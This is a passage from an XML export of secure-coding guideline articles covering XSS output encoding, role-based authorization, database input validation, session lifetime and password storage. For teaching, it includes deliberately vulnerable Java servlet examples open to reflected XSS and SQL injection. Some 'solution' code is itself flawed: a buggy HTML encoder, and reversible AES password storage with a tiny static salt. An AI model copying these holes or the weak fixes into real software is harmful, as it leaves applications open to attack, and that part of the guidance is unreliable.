encoder which takes the variable between the brackets as its input. Example: </p><blockquote><pre>&lt;%= {output} %&gt;</pre></blockquote></li></ul></li><li><p><strong>Apply the encoding. </strong>After identifying the echoed input and determining the appropriate encoding method, apply the encoding before the input is returned to the client.</p></li></ol><h1>Problem Example</h1><p>The following code produces a data analysis based on a financial index. Because it does not HTML encode the echoed input, the application is vulnerable to reflective cross-site scripting.</p><blockquote><pre>import java.io.*;<br>import java.util.*;<br>import java.lang.*;<br>import javax.servlet.*;<br>import javax.servlet.http.*;<br>import java.util.regex.*;<br> public final class DataAggregator extends HttpServlet<br>{<br>      public void doGet<br>             (<br>            HttpServletRequest request,<br>             HttpServletResponse response<br>            )<br>            throws ServletException, IOException<br>      {<br>            PrintWriter out = response.getWriter();<br>            String searchTerm = request.getParameter("index");<br>             try<br>            {<br>                  if (validateSearchTerm(searchTerm))<br>                  {<br>                        String retString;<br>                         retString = "The queried index \"";<br>                         // The application does not HTML encode<br>                         //     the returned input<br>                        retString += searchTerm;<br>                         retString += "\" results in:&lt;br&gt; ";<br>                        out.println(retString);<br>                        common.aggregateData(out, searchTerm);<br>                  }<br>                  else<br>                  {<br>                        // Add appropriate logging and exception handling<br>                         // mechanisms. Consult the Exception Handling and<br>                         // Logging sections<br>                         out.println("Unable to process at the moment."<br>                                 + " Please try again later.");<br>                  }<br>            }<br>             catch (Exception e)<br>            {<br>                  // Add the appropriate logging and exception handling<br>                   // mechanisms. Consult the Exception Handling<br>                   // and Logging sections<br>                   out.println("Unable to process at the moment."<br>                           + " Please try again later.");<br>            }<br>             out.flush();<br>            out.close();<br>      }<br>}</pre></blockquote><h1>Solution Example</h1><p>The following code produces a data analysis based on a financial index. Because the code HTML encodes the echoed input, it is impossible for an attacker to exploit the application via reflective cross-site scripting.</p><blockquote><pre>import java.io.*;<br>import java.util.*;<br>import java.lang.*;<br>import javax.servlet.*;<br>import javax.servlet.http.*;<br>import java.util.regex.*;<br> public final class DataAggregator extends HttpServlet<br>{<br>      public void doGet<br>      (<br>        HttpServletRequest request,<br>         HttpServletResponse response<br>      )<br>            throws ServletException, IOException<br>      {<br>            PrintWriter out = response.getWriter();<br>            String searchTerm = request.getParameter("index");<br>             try<br>            {<br>                  if (validateSearchTerm(searchTerm))<br>                  {<br>                        String retString;<br>                         retString = "The queried index \"";<br>                         // The application HTML encodes the echoed input<br>                        retString += encodeHtml(searchTerm);<br>                         retString += "\" results in :&lt;br&gt; ";<br>                        out.println(retString);<br>                        common.aggregateData(out, searchTerm);<br>                  }<br>                  else<br>                  {<br>                        // Add the appropriate logging and exception<br>                         // handling mechanisms. Consult the Exception<br>                         // Handling and Logging sections<br>                         out.println("Unable to process at the moment."<br>                                 + " Please try again later.");<br>                  }<br>            }<br>            catch (Exception e)<br>            {<br>                  // Add the appropriate logging and exception<br>                   // handling mechanisms. Consult the Exception<br>                   // Handling and Logging sections<br>                   out.println("Unable to process at the moment."<br>                           + " Please try again later.");<br>            }             out.flush();<br>            out.close();<br>      }<br>       public String encodeHtml(String input)<br>      {<br>            StringBuffer out = new StringBuffer();<br>             for (int i = 0; i &lt; input.length(); i++)<br>            {<br>                  char c = input.charAt(i);<br>                  if (c == '&lt;')<br>                  {<br>                        out.append("&amp;lt;");<br>                  }<br>                  else if (c == '&gt;')<br>                  {<br>                        out.append("&amp;gt;");<br>                  }<br>                  else if (c == '\"')<br>                  {<br>                        out.append("&amp;quot;");<br>                  }<br>                  else if (c == '\'')<br>                  {<br>                        out.append("&amp;quot;");<br>                  }<br>                  else if (c == '&amp;')<br>                  {<br>                        out.append("&amp;amp;");<br>                  }<br>                  else if (c &gt; 0x20 &amp;&amp; c &lt; 0x126)<br>                  {<br>                        out.append(c);<br>                  }<br>                  else<br>                  {<br>                        out.append("&amp;#" + (int)c + ";");<br>                  }<br>            }<br>             return out.toString();<br>      }<br>}</pre></blockquote><h1>Additional Resources</h1><ul><li>To learn more about preventing cross-site scripting, see: <a href="http://support.microsoft.com/kb/252985">How to prevent cross-site scripting security issues</a>.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:BC10DCE2-CA48-44BF-8BF6-FEFBE8DCCB7E">Attack: Cross Site Scripting Attack</a> </li><li><a href="ruledisplay:2B17E816-C6C4-4B05-BE92-01DC71073F66">Attack: Response Splitting Attack</a> </li><li><a href="ruledisplay:198CBDAF-3F87-4291-870D-8B6F077D8D36">Attack: AJAX Injection Attack</a> </li><li><a href="ruledisplay:D4DBB48C-D394-4632-B72F-148BCD87E9D9">Checklist Item: All Output Data is Encoded (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1905721199" Content_Hash="-393509813">
    <Metadata>
      <Id>500a3e89-2937-41b8-99cc-a19dc7696ed6</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Perform Role-based Security Checks</Title>
      <Category>Authorization</Category>
      <Phase>Design</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Enumerate the different types of users and create specific roles for them. When authorizing access to a resource, build the security checks on a per-role basis rather than on a per-user basis.</p><h1>Why</h1><p>Application roles allow administrators to group users into categories that need the same level of privileges. The mechanism provides an easy and clear way to discover and manage the least privileges necessary for the execution of a given task. It provides a more robust and flexible way of managing the application's users.</p><h1>When</h1><p>If your application uses access control and authorizes its users to application resources.</p><h1>How</h1><p>To apply this concept access control should be based on a user's role rather than the actual user.</p><p>Use the following steps when designing the role-based security:</p><ol><li><p><strong>Understand the different types of users</strong>: Enumerate the different types of users needed for the application. Understand how they willl use the application and to which resources they will need access. Create a matrix mapping the actions each role is authorized to perform with the corresponding system components. Use this matrix to identify the different types of users according to the functionality they need. Creating a threat model may be a useful step to ensure that you correctly understand the implications of this matrix.</p></li><li><p><strong>Establish the roles</strong>: Define which resources can be accessed by each role. There are two approaches when enforcing role-based security - programmatic and declarative.</p><ul><li><p><strong>Programmatically</strong>: The programmatic approach to role-based security is written inside the code and provides additional runtime flexibility. It allows your application to dynamically create and assign roles so that user privileges can be granted and revoked without the need of restarting your application. When using the programmatic approach to role-based security, place access control checks at the appropriate locations in your application. For example, the following code requires users to be shareholders in order to generate a financial report:</p><pre>public void GenerateFinancialReport(DateTime startDate, DateTime endDate)<br>{<br>    if (HttpContext.Current.User.IsInRole("ShareHolders"))<br>    {<br>        // Generate the relevant financial report<br>    }<br>}</pre><p>Additionally, your application can programmatically check if a user is member of a local Windows group.</p><pre>public void RetrieveLogs(ref Hashtable logTable)<br>{<br>    WindowsPrincipal user = new WindowsPrincipal((WindowsIdentity)HttpContext.Current.User.Identity);<br>    if (user.IsInRole(WindowsBuiltInRole.Administrator))<br>    {<br>        // Add logic for retrieving logs<br>    }<br>}</pre></li><li><p><strong>Declarative</strong>: The declarative approach to role-based security is done via the configuration files. It allows easy manageability as the declarations can be modified without having to recompile. By using the declarative approach, you can easily manage the security settings for large portions of the application without changing the source code. ASP.NET applications that use declarative security specify the appropriate roles inside <strong>web.config</strong>. The following elements enforce role-based security through <strong>web.config</strong>:</p><ul><li><p><strong>roleManager</strong>: Configures the ASP.NET role manager. Applicable only if form-based authentication is used. Example:</p><pre>&lt;connectionStrings&gt;<br>  &lt;add name="MyAppSqlConnection"<br>       connectionString="Server=serv02.example.com; Database=myapp; Integrated Security=SSPI;"<br>       providerName="System.Data.SqlClient"/&gt;<br> ...<br> &lt;system.web&gt;<br>   &lt;roleManager enabled="true" cacheRolesInCookie="false" defaultProvider ="ProjectRoleProvider"&gt;<br>    &lt;providers&gt;<br>      &lt;clear /&gt;<br>      &lt;add name="MyAppRoleProvider"<br>            type="System.Web.Security.SqlRoleProvider"<br>            connectionStringName="MyAppSqlConnection"<br>            applicationName="MyApp"/&gt;</pre></li><li><p><strong>authorization</strong>: Encapsulates the authorization settings for a resource.</p></li><li><p><strong>allow</strong>: Represents the users and roles that are allowed access to the given resource.</p></li><li><p><strong>deny</strong>: Represents the users and roles that are denied access to the given resource.</p></li></ul><p>For example:</p><pre>&lt;!-- web.config --&gt;<br>&lt;system.web&gt;<br>   &lt;authentication mode="Windows" /&gt;<br>   &lt;authorization&gt;<br>    &lt;allow roles="BUILTIN\Administrators"/&gt;<br>    &lt;deny users="*"/&gt;<br>  &lt;/authorization&gt;<br>&lt;/system.web&gt;</pre><p>Additionally, if your application uses form-based authentication, you can configure your application's access controls through Visual Studio's ASP.NET Configuration, available by accessing the <strong>Website -&gt; ASP.NET Configuration</strong> menu.</p><p>Note that if you use Windows authentication, you will need to manage your application's users and user roles through managing Windows users and groups.</p></li></ul></li><li><p><strong>Manage the users</strong>: Assign the users into their respective user roles. The application should enforce the security policy according to the user roles instead of the actual user. Based on your application's mechanism to enforce role-based access controls, use one of the following techniques to manage your application's users:</p><ul><li><p><strong>Programmatically</strong>: ASP.NET allows you to manage your application's users through the <strong>Roles</strong> class.</p><p>Use the following methods to assign users into roles:</p><ul><li><strong>AddUserToRole</strong> </li><li><strong>AddUserToRoles</strong> </li><li><strong>AddUsersToRole</strong> </li><li><strong>AddUsersToRoles</strong></li></ul><p>Example:</p><pre>Roles.AddUserToRole("eric", "ShareHolders");</pre><p>Use the following methods to remove users from roles:</p><ul><li><strong>RemoveUserFromRole</strong> </li><li><strong>RemoveUserFromRoles</strong> </li><li><strong>RemoveUsersFromRole</strong> </li><li><strong>RemoveUsersFromRoles</strong></li></ul><p>Example:</p><pre>Roles.RemoveUserFromRole("eric", "ShareHolders");</pre></li><li><p><strong>Declarative</strong>: Use the ASP.NET Role Manager to manage your application's users. If your application uses form-based authentication, you can configure your application's access controls through Visual Studio's ASP.NET Configuration, available by accessing the <strong>Website -&gt; ASP.NET Configuration</strong> menu.</p></li><li><p><strong>Windows</strong>: If your application uses Windows authentication, use the Windows <strong>Local Users and Groups</strong> service to manage your application's users. If your server is connected to your organization's NT Domain or Active Directory forest, user and role management will be performed by your organization's network administrators.</p></li></ul></li></ol><h1>Problem Example</h1><p>The following segment illustrates an application's access control policy. Because the application does not enforce role-based security, it has a policy entry for each separate user; therefore managing the users' access rights can be quite difficult when the number of users to the application grows.</p><pre>&lt;authorization&gt;<br>  &lt;allow users="NTDomain\joe, NTDomain\sarah, NTDomain\bill, NTDomain\sue"/&gt;<br>  &lt;deny users="*"/&gt;<br>&lt;/authorization&gt;</pre><h1>Solution Example</h1><p>The following segment illustrates an application's access control policy. Because the application enforces role-based security, it provides a policy entry for each group of users; therefore increasing the application's users store has no impact on the ability to manage the users' access rights as only the group permissions need to be modified.</p><pre>&lt;authorization&gt;<br>  &lt;allow roles="NTDomain\Employees"/&gt;<br>  &lt;deny users="*"/&gt;<br>&lt;/authorization&gt;</pre><h1>Additional Resources</h1><ul><li>To learn more about the roleManager element in web.config, visit: Documentation for <a href="http://msdn2.microsoft.com/en-us/library/ms164660(vs.80).aspx">roleManager Element</a> in MSDN.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:610BAA36-8A3C-404D-81D8-403ED054FEC4">Guideline: Partition Application Between Public and Private Domains </a></li><li><a href="ruledisplay:3E8C3E82-D02C-4322-87F6-0D2F0FA55DD2">Guideline: Partition Application Between Public and Private Domains</a> </li><li><a href="ruledisplay:14FBF85D-0E97-4CD1-A0EE-D5AA791FA45C">Guideline: Define a Security Policy </a></li><li><a href="ruledisplay:FC9AF70F-092C-4AC6-9B54-6793DE17B8DD">Attack: Business Rule Attack</a> </li><li><a href="ruledisplay:AE79E2C4-186C-47E4-8D05-3C6ECAB2E1AF">Checklist Item: Role-Based Security Checks are Performed </a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1917746851" Content_Hash="-1666851222">
    <Metadata>
      <Id>518f71dd-7173-4801-8a48-c0108b294809</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Validate All Input Passed to Database</Title>
      <Category>Data Access</Category>
      <Phase>Implementation</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Applications written using Servlets or JSP&nbsp;that interact with a database.</li></ul><h1>What to Do</h1><p>Validate all input before it is passed to the database.</p><h1>Why</h1><p>Unvalidated input can lead to persistent cross-site scripting, SQL injection and other vulnerabilities which would allow an attacker to gain unauthorized access to sensitive data.</p><h1>When</h1><p>If your application uses a backend database server, then validate all input before it is passed to the database.</p><h1>How</h1><p>To properly validate input passed to database:</p><ol><li><strong>Identify database entry points. </strong>Identify all locations within your application that interface with the database servers. Potential sources of input include: <ul><li>URL-based parameters </li><li>Form-based parameters </li><li>Hidden fields </li><li>Cookies </li><li>Local filesystem </li><li>Javascript variables</li></ul></li><li><p><strong>Create a set of validators.</strong></p><ol><li><p>Build a set of validators that work with the database-specific language. Using the <a href="ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559">Validate Input for Length, Range, Format, and Type</a> guideline, determine the appropriate validation at each validator.</p></li><li><p>Centralize the validators as it helps strengthen your code by limiting the amount of scattered validation code throughout the component.</p></li><li><p>Place the validators along the database entry points. All data should pass through the validators before transmitted to the database servers.</p></li></ol></li><li><p><strong>Use type safe SQL parameters in queries. </strong>Stored procedures and parameterized queries improve your application's robustness against SQL injection based attacks. Consult the <a href="ruledisplay:9DF701E2-7929-4533-9DC3-368AAC4E553D">Use Type Safe SQL Parameters When Constructing SQL Queries</a> and <a href="ruledisplay:ADE80907-B490-4FD3-81A8-826117E25662">Use Stored Procedures</a> guidelines for more details.</p></li></ol><h1>Problem Example</h1><p>The following code allows the user to query a database. Unfortunately, the application fails to validate the user's input; therefore, an attacker can access the backend database on behalf of the application through the use of SQL injection. </p><blockquote><pre>public void doGet(HttpServletRequest request,<br>     HttpServletResponse response) throws ServletException, IOException{<br>     PrintWriter out = response.getWriter();<br>     String query = request.getParameter("query");<br>     String retData = "";<br> <br>     // The application fails to validate the user-supplied<br>     // query before submitting it to the database server<br>     retData = queryDB(query);<br> <br>     ...<br> <br>     out.flush();<br>     out.close();<br>}</pre></blockquote><h1>Solution Example</h1><p>The following code allows the user to query a database. Because the application validates the user's input, it is much more difficult for an attacker to access the backend database through a SQL injection attack.</p><blockquote><pre>public void doGet(HttpServletRequest request,<br>     HttpServletResponse response) throws ServletException, IOException{<br>     PrintWriter out = response.getWriter();<br>     String query = request.getParameter("query");<br>     String retData = "";<br> <br>     // The application validates the user-supplied query<br>     // before submitting it to the database server<br>     if (validateQuery(query))<br>     {<br>          retData = queryDB(query);<br> <br>          ...<br> <br>     }<br> <br>     out.flush();<br>     out.close();<br>}<br> <br> <br>public boolean validateQuery(String input){<br> <br>      // The input can be only of numeric characters<br>      String goodPattern = "[0-9]++";<br> <br>      Pattern p = Pattern.compile(goodPattern);<br>      Matcher m = p.matcher(input);<br> <br>      if(!m.matches())<br>      {<br>            return false;<br>      }<br> <br>      return true;<br>}</pre></blockquote><h1>Additional Resources</h1><ul><li>A tutorial on regular expressions is available at <a href="http://www.regular-expressions.info/">Regular-Expressions.info</a>. </li><li>For more information on using regular expression in Java, see: Documentation for <a href="http://download.oracle.com/javase/1.4.2/docs/api/java/util/regex/Pattern.html">Class Pattern</a> in Java SDK. </li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:65482066-7D67-44BD-B959-D962D527A89B">Checklist Item: All Database Input is Validated (Java Web Application)</a> </li><li><a href="ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559">Guideline: Validate Input for Length, Range, Format, and Type (Java Web Application)</a> </li><li><a href="ruledisplay:9DF701E2-7929-4533-9DC3-368AAC4E553D">Guideline: Use Type Safe SQL Parameters When Constructing SQL Queries (Java Web Application)</a> </li><li><a href="ruledisplay:ADE80907-B490-4FD3-81A8-826117E25662">Guideline: Use Stored Procedures (Java Web Application)</a> </li><li><a href="ruledisplay:71225A92-ECA2-481E-ADEE-EA9C222DEA43">Guideline: Validate Input from All Sources (Java Web Application)</a> </li><li><a href="ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764">Attack: SQL Injection Attack</a> </li><li><a href="ruledisplay:8515588C-661A-4962-853F-6CD6ABCD8CF6">Attack: Server-Side Code Injection Attack</a> </li><li><a href="ruledisplay:D47CF578-0D27-4F11-B594-C508E50982B5">Checklist Item: All Data Passed Between Native and Java Code is Validated (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-167903481" Content_Hash="-171755971">
    <Metadata>
      <Id>52a195b8-bc65-413c-8308-31649d8fb60b</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Encrypt the Data or Secure the Communication Channel</Title>
      <Category>Sensitive Data</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Web Application&nbsp;</li></ul><h1>What to Do</h1><p>When passing sensitive data over the network, check that the data is either encrypted by the application or that the data is only passed over encrypted communication links.</p><h1>Why</h1><p>Sensitive data passed across the network to and from the database server may include application specific data or database login credentials. To ensure the privacy and integrity of data over the network, either use a platform-level solution (such as that provided by a secure datacenter where IPSec encrypted communication channels are used between servers) or configure your application to establish SSL connections to the database.</p><h1>When</h1><p>When you pass sensitive data over the network, make sure it remains private and unaltered.</p><h1>How</h1><p>If you are sending sensitive data over the network to the client, encrypt the data or secure the channel. A common practice is to use SSL between the client and Web server. Between servers, an increasingly common approach is to use IPSec. For securing sensitive data that flows through several intermediaries, for example, Web service Simple Object Access Protocol (SOAP) messages, use message level encryption.</p><h1>Additional Resources</h1><ul><li>Design Guidelines for Secure Web Applications <a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx">http://msdn2.microsoft.com/en-us/library/aa302420.aspx</a> </li><li>Architecture and Design Review for Security <a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx">http://msdn2.microsoft.com/en-us/library/aa302420.aspx</a> </li><li>Security Question List: ASP.NET 2.0 <a href="http://msdn2.microsoft.com/en-us/library/ms998375.aspx">http://msdn2.microsoft.com/en-us/library/ms998375.aspx&nbsp;</a> </li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="467720348" Content_Hash="-24882224">
    <Metadata>
      <Id>539222c3-efd5-4387-b4e7-b24f9f461ba6</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Limit Session Lifetime</Title>
      <Category>Session Management</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Web Application</li></ul><h1>What to Do</h1><p>Reduce the lifetime of sessions to mitigate the risk of session hijacking and replay attacks.</p><h1>Why</h1><p>Even when using SSL, there's still&nbsp;a risk of session hijacking and replay; there are lots of other out-of-band ways to steal session tokens.&nbsp; The shorter the session timeout, however, the less time an attacker has to capture a session cookie and use it to access your application.</p><h1>When</h1><p>All applications should consider the length of their sessions carefully, and any application protecting any sensitive information should make it as short as possible.</p><h1>How</h1><p>There are two pieces of information that need to be handled to limit the session lifetime.&nbsp; The first is the actual session cookie and the second is the server side session state.&nbsp; With most frameworks, each time the user takes an action on the site the timestamps on the session cookie&nbsp;and the corresponding field in the server-side session state&nbsp;are both reset to the current time.&nbsp; If someone attempts to use an expired cookie, the timestamp in the server-side session state for that session is checked and the request is disallowed.&nbsp; If the session is old enough that the server-side state has been deleted, it's denied immediately.&nbsp; In web farms, the timestamp may be embedded in the cookie and cryptographically signed, freeing up servers from the need to keep a single explicit session-state table.</p><p>Most web application frameworks will handle the details for you, so you'll only need to specify a simple timeout value.&nbsp; In some situations, you'll be able to choose whether the session timer should reset after each action (an idle timer, the default) or if it should be a single fixed timer from the initial login (an absolute timer).&nbsp; The latter is useful for fast transactions and especially security critical situations.</p><p>For most situations, thirty minutes is the maximum that an idle session should be accepted.&nbsp; For sites which handle sensitive information, ten minutes is more appropriate.&nbsp; If you want to allow a user to browse a site and let sessions sit for long periods of time and retain a customized experience, you can seperate out the cookies that control site customization from those that control access to more sensitive information or functionality; the customization cookies can be persisted while the actual session is expired.</p><h1>Problem Example</h1><p>A web site uses the default (one hour) session time set by their web application framework.&nbsp; When a user in an internet cafe forgets to log off, an attacker using the machine after them can browse to the site and use the old session to gain access to the victim's sensitive information.</p><h1>Solution Example</h1><p>A web site locks down its session timeouts to ten minutes, overriding the default set by their web application framework.&nbsp; When a user in an internet cafe forgets to log off, an attacker using the machine after them cannot browse to the site and use the old session to gain access to the victim's sensitive information, because the session has already expired.</p><h1>Additional Resources</h1><ul><li>For more information see, "Chapter 4 - Design Guidelines for Secure Web Applications" at <a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx">http://msdn2.microsoft.com/en-us/library/aa302420.aspx</a>&nbsp;&nbsp; </li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1741103882" Content_Hash="-1856361385">
    <Metadata>
      <Id>5785aae6-b3d7-47d7-ab4e-31be81f29caf</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Store Passwords Securely</Title>
      <Category>Authentication</Category>
      <Phase>Implementation</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Applications written using Servlets or JSP.</li></ul><h1>What to Do</h1><p>Store passwords in a secure fashion. Do not store in plain text or use an easy-to-crack encryption or obfuscation scheme.</p><h1>Why</h1><p>Storing passwords in plaintext or using weak encryption can aid an attacker when stealing them. Compromised passwords may aid an attacker into accessing, modifying and deleting sensitive data.</p><h1>When</h1><p>This guideline should be followed only if your application requires that you store passwords. This may be necessary if, for instance, your application must retrieve the original password at some point. Otherwise, follow the <a href="ruledisplay:9AE15BFD-0C19-4539-A77A-BB1ADF93CA9A">Do Not Store Passwords</a> guideline.</p><h1>How</h1><p>Use the following steps to store passwords securely:</p><ol><li><p><strong>Choose user-identifiable data. </strong>User-identifiable data will be used to generate a secure key. This data should be tied to the user's account, and it should be different for every user. For example, a valid email address would fit into this category. If your application uses the email address approach, confirm that the address is real and verify that no&nbsp;two users are sharing an email address.</p></li><li><p><strong>Generate the&nbsp;key. </strong>Use the user-identifiable data and some random salt to generate the key. Because encryption key sizes need to be 256 bit, it is recommended to generate the key by hashing the user-identifiable data with some random salt. This technique makes it impossible for an attacker to obtain the encryption key&nbsp;unless he also&nbsp;obtains your application's random salt.<br><br>Make sure that you securely clean-up all instances of the generated encryption key as it can help an attacker compromise the protected password if the key is exposed. Consult the <a href="ruledisplay:E5D7DA05-EB59-46C5-AF9F-BA1B32C783CE">Clear Sensitive Data from Memory when No Longer Used</a> guideline for more details. Example of generating an encryption key:</p><blockquote><pre>byte[] salt = MyApp.generateSalt();<br>String userMail = <a href="mailto:myapp@example.com">myapp@example.com</a>;<br>MessageDigest md = MessageDigest.getInstance("SHA-512");<br>md.update(userMail.getBytes("UTF-8"));<br>md.update(salt);<br>byte[] rawKey = md.digest();<br>md.reset();</pre></blockquote><p>If your application uses a randomly generated salt, make sure that your application encrypts the random salt and stores it into a configuration file. Always use <strong>SecureRandom</strong> and not <strong>Random</strong> to generate the salt. Example of using <strong>SecureRandom</strong> to generate a random salt:</p><blockquote><pre>public static byte[] generateSalt() throws NoSuchAlgorithmException<br>{<br>      // Note that salt is declared as private static byte[] and is<br>      // initialized to null.<br>       if (salt == null)<br>      {<br>            SecureRandom srand = SecureRandom.getInstance("SHA1PRNG");<br>                          salt = new byte[4];<br>            srand.nextBytes(salt);<br>      }<br>       return salt;<br>}</pre></blockquote><p>For more information, consult the documentation for <a href="http://java.sun.com/j2se/1.4.2/docs/api/java/security/SecureRandom.html">SecureRandom Class</a> in the Java SDK.</p></li><li><p><strong>Choose an&nbsp;appropriate encryption function. </strong>Choose a strong symmetric encryption algorithm that will not be easy for an attacker to break such as AES.</p><blockquote><pre>byte[] salt = MyApp.generateSalt();<br>String userMail = <a href="mailto:myapp@example.com">myapp@example.com</a>;<br>MessageDigest md = MessageDigest.getInstance("SHA-512");<br>md.update(userMail.getBytes("UTF-8"));<br>md.update(salt);<br>byte[] rawKey = md.digest();<br>md.reset();<br>SecretKeySpec skeySpec = new SecretKeySpec(rawKey, "AES");<br>// Set up cipherCipher cipher = Cipher.getInstance("AES");<br>cipher.init(Cipher.ENCRYPT_MODE, skeySpec);<br>// Note that pass is declared as byte[] and contains the user's password<br>byte[] encrypted = cipher.doFinal(pass);</pre></blockquote><p>Because of import control restrictions, Java initially ships with a limited set of cryptography. To fully utilize Java's crypto strength, it is recommended to install the "Unlimited Strength" <a href="http://java.sun.com/products/jce/index-14.html">Jurisdiction Policy Files</a>.</p></li></ol><p><strong>Note:</strong> Never store the user credentials or their encrypted values on the client side (e.g. in cookies, hidden fields, etc.). Use sessions when there is a need to track the user or to&nbsp;store their encrypted credentials. For more information, consult the Session Management section.</p><h1>Problem Example</h1><p>The following code authenticates a user based on a username and password. The supplied credentials are compared to the credentials stored in the backend database. Unfortunately, the credentials in the database are in plaintext and could be stolen if the database is compromised.</p><blockquote><pre>public boolean validateUser(String user, char[] pass)<br>{<br>      // Query the credential store with the provided credentials<br>      ...<br>}</pre></blockquote><h1>Solution Example</h1><p>The following code validates the user based on a&nbsp;given username and password. It uses the user's valid email address and a random salt to encrypt the user's password. Then it compares the username and the produced digest against the data stored in the backend database. Therefore, the password is stored encrypted in the database.</p><blockquote><pre>public boolean validateUser(String user, char[] pass)<br>{<br>       ...<br>       // Encrypt the credentials<br>      try<br>      {<br>            userEmail = MyApp.getEmailForUser(user);<br>            passDigest = encryptCredentials(userEmail, pass, salt);<br>      }<br>      catch (GeneralSecurityException gse)<br>      {<br>            // Add the appropriate logging and exception handling mechanisms<br>             <br>            return false;<br>      }<br>      catch (IOException ioe)<br>      {<br>            // Add the appropriate logging and exception handling mechanisms<br>            return false;<br>      }<br>       // Query the credential store and execute the rest of the authentication steps<br>      ...<br>}<br>public static byte[] encryptCredentials(String email, char[] pass, byte[] salt)<br>       throws GeneralSecurityException, IOException<br>{<br>      MessageDigest md;<br>      byte[] tempPass;<br>      byte[] rawKey;<br>      // Generate encryption key<br>      md = MessageDigest.getInstance("SHA-512");<br>      md.update(email.getBytes("UTF-8"));<br>      md.update(salt);<br>      rawKey = md.digest();<br>      md.reset();<br>      SecretKeySpec skeySpec = new SecretKeySpec(rawKey, "AES");<br>      // Set up cipher<br>      Cipher cipher = Cipher.getInstance("AES");<br>      cipher.init(Cipher.ENCRYPT_MODE, skeySpec);<br>      // Convert char[] to byte[]<br>      tempPass = new byte[pass.length];<br>      for (int i = 0; i &lt; pass.length; i++)<br>      {<br>            tempPass[i] = (byte)pass[i];<br>      }<br>      // Encrypt password<br>      byte[] encrypted = cipher.doFinal(tempPass);<br>            //Clean tempPass<br>      for (int i = 0; i &lt; tempPass.length; i++)<br>      {<br>            tempPass[i] = 0;<br>      }<br>      return encrypted;<br>}</pre></blockquote><h1>Additional Resources</h1><ul><li>To learn more about the JCE API, see: <a href="http://download.oracle.com/javase/1.4.2/docs/guide/security/jce/JCERefGuide.html">Java Cryptography Extension for the Java 2 SDK, v 1.4</a>. </li><li>For more information about securely generating random numbers, see: Documentation for <a href="http://download.oracle.com/javase/1.4.2/docs/api/java/security/SecureRandom.html">Class SecureRandom</a> in Java SDK.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:9AE15BFD-0C19-4539-A77A-BB1ADF93CA9A">Guideline: Do Not Store Passwords (Java Web Application)</a> </li><li><a href="ruledisplay:E5D7DA05-EB59-46C5-AF9F-BA1B32C783CE">Guideline: Clear Sensitive Data from Memory when No Longer Used (Java Web Application)</a> </li><li><a href="ruledisplay:8EDBAC9F-BFCF-43DF-A4FA-5BB7E03E7410">Guideline: Do Not Leave Passwords in Memory (Java Web Application)</a> </li><li><a href="ruledisplay:3B657A67-F660-4DB5-9267-6E0FE2DAA1EB">Attack: Chosen Ciphertext Attack</a> </li><li><a href="ruledisplay:DEBB5734-39D0-4922-BDEE-1E0547E22DAD">Attack: Chosen Plaintext Attack</a> </li><li><a href="ruledisplay:44E50CB3-9B24-4BC3-8CBA-73112F3C11BF">Checklist Item: Passwords are Stored Securely (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-757548618" Content_Hash="-496198970">
    <Metadata>
